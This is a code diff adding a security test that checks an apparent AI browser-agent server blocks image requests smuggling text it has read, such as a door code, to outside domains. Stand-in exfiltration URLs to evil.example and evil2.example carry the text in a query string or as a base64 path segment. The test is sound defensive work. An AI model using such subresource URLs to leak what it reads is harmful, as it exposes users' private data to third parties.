@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: AGPL-3.0-only
 // Named security tests (AGENTS.md rule 2), against the server with a fake browser.
-import { describe, test, beforeEach, afterEach } from "node:test";
+import { describe, test, beforeEach, afterEach, after } from "node:test";
 import assert from "node:assert/strict";
 import { ROUTES, TOOLS } from "@crossbar/shared";
 import { startTestApp, sleep, type FakeTab, type FakePool } from "./helpers.ts";
@@ -427,5 +427,34 @@ describe("packaging", () => {
       const file = readFileSync(resolve(import.meta.dirname, `../../harbor/build/${svc}.Dockerfile`), "utf8");
       assert.equal(file, render(target), `harbor/build/${svc}.Dockerfile is stale: run node scripts/harbor-dockerfiles.mjs`);
     }
+  });
+});
+
+describe("taint and subresources", () => {
+  test("after a signed-in read, images can't carry read text or encoded blobs to a new domain", async () => {
+    const t = await startTestApp();
+    after(() => t.close());
+    const pool = t.pool as FakePool;
+    t.services.sites.set("alice", { pattern: "reddit.com", level: "read_as_you" }, "user");
+    pool.pages.set("https://old.reddit.com/r/x", { content: "the door code for the meetup is 4417 and the address is 12 Elm Street" });
+    const c = await t.mcpClient(t.token("alice", "act"));
+    await c.call("open", { url: "https://old.reddit.com/r/x" });
+    const tab = [...pool.tabs].reverse().find((x) => x.profile === "personal")!;
+    // Before any read: ordinary third-party images load.
+    assert.equal(tab.simulate({ url: "https://cdn.example/a.png?w=300", resourceType: "Image" }).verdict, "allow");
+    await c.call("read");
+    // Ordinary CDN query strings still load after taint.
+    assert.equal(tab.simulate({ url: "https://cdn2.example/b.png?w=300&v=2", resourceType: "Image" }).verdict, "allow");
+    // Read text in a query string: refused and flagged.
+    const leak = tab.simulate({ url: "https://evil.example/p.gif?d=the+door+code+for+the+meetup+is+4417", resourceType: "Image" });
+    assert.equal(leak.verdict, "deny");
+    assert.match(leak.rule ?? "", /taint_subresource/);
+    // A long base64 blob in a path segment: refused.
+    const blob = Buffer.from("the door code for the meetup is 4417, address 12 Elm Street, see you there").toString("base64url");
+    assert.equal(tab.simulate({ url: `https://evil2.example/${blob}.png`, resourceType: "Image" }).verdict, "deny");
+    // The page's own site isn't an exit.
+    assert.equal(tab.simulate({ url: "https://old.reddit.com/api/info?id=the+door+code+for+the+meetup+is+4417", resourceType: "XHR" }).verdict, "allow");
+    const flags = (await c.call("list_flags")).data as unknown as Array<{ domain: string }>;
+    assert.ok(flags.some((f) => f.domain === "evil.example"));
   });
 });
